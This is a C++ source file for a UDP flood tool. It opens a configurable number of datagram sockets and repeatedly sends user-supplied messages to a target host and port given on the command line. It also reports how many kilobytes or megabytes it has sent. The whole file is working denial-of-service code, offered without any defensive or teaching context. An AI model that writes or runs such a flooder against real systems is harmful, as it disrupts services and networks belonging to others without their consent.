#include <arpa/inet.h>
#include <bits/stdc++.h>
#include <cstdlib>
#include <cstring>
#include <netinet/in.h>
#include <sys/socket.h>

class Config {
public:
  Config(int argc, char *argv[]) {
    if (argc > 1)
      m_HOST = argv[1];
    if (argc > 2)
      m_PORT = std::stoi(argv[2]);
    if (argc > 3)
      m_numberOfSockets = std::stoi(argv[3]);
    if (argc > 4)
      m_numberOfSends = std::stoi(argv[4]);
    if (argc > 5) {
      m_messages.clear();
      for (int i = 5; i < argc; i++) {
        m_messages.push_back(argv[i]);
      }
    }
  }
  [[nodiscard]] int getPort() const { return m_PORT; }
  void setPort(int port) { m_PORT = port; }
  [[nodiscard]] const std::string &getHost() const { return m_HOST; }
  void setHost(const std::string &host) { m_HOST = host; }
  [[nodiscard]] int getNumberOfSockets() const { return m_numberOfSockets; }
  void setNumberOfSockets(int n) { m_numberOfSockets = n; }
  [[nodiscard]] int getNumberOfSends() const { return m_numberOfSends; }
  void setNumberOfSends(int m) { m_numberOfSends = m; }
  [[nodiscard]] const std::vector<const char *> &getMessages() const {
    return m_messages;
  }
  void setMessages(const std::vector<const char *> &messages) {
    Config::m_messages = messages;
  }

private:
  int m_PORT = 8080;
  std::string m_HOST{"192.168.0.12"};
  int m_numberOfSockets = 3;
  int m_numberOfSends = 1;
  std::vector<const char *> m_messages{"XXX"};
};

void create_sockets(std::vector<int> &socks, const Config &config) {
  socks.resize(config.getNumberOfSockets());
  for (auto &s : socks) {
    if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
      perror("socket creation failed");
      exit(EXIT_FAILURE);
    }
  }
}

sockaddr_in create_address(const Config &config) {
  sockaddr_in servaddr{};
  memset(&servaddr, 0, sizeof(servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_port = htons(config.getPort());
  inet_pton(AF_INET, config.getHost().c_str(), &(servaddr.sin_addr));
  return servaddr;
}

void flood(int sock, const Config &config, const sockaddr_in &targetAddr) {
  for (auto &message : config.getMessages()) {
    sendto(sock, message, strlen(message), MSG_NOSIGNAL,
           reinterpret_cast<const sockaddr *>(&targetAddr), sizeof(targetAddr));
  }
}

size_t calcMessagesSize(const Config &config) { // bytes
  size_t size = 0;
  for (auto &message : config.getMessages()) {
    size += strlen(message);
  }
  return size;
}

size_t bytesToKB(size_t bytes) { return bytes / 1024; }

int main(int argc, char *argv[]) {
  Config config{argc, argv};
  std::vector<int> socks{};
  create_sockets(socks, config);
  sockaddr_in targetAddr = create_address(config);
  size_t sends{0}; // KB
  std::cout << "Flood start\n";
  for (int i = 0; i < config.getNumberOfSends(); i++) {
    for (auto &s : socks) {
      flood(s, config, targetAddr);
    }
    sends += bytesToKB(calcMessagesSize(config) * socks.size());
    if (i % 100 == 0) {
      if (sends < 1024 * 4)
        std::cout << "\rSends: " << sends << " KB" << std::flush;
      else
        std::cout << "\rSends: " << sends / 1024 << " MB" << std::flush;
    }
  }
  std::cout << "\nFlood finish\n";
  return 0;
}
